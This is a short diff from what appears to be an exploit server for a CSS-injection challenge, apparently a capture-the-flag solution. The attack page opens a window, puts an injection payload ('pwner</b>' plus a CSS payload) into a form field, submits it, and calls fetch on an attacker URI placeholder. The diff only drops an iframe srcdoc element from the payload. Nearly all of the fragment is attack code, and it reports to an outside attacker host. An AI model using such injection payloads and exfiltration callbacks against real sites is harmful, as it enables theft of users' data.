@@ -97,7 +97,7 @@ app.get('/', (c) => {
       const w = open('', 'w')
       const sleep = t => new Promise(r => setTimeout(r, t))
       // set payload
-      input.value = \`pwner<\\/b>\\n<iframe srcdoc=''></iframe>${cssi_payload}<b>!\`
+      input.value = \`pwner<\\/b>\\n${cssi_payload}<b>!\`
       form.submit()
       await sleep(1000)
       await fetch("${ATTACKER_URI}/set")
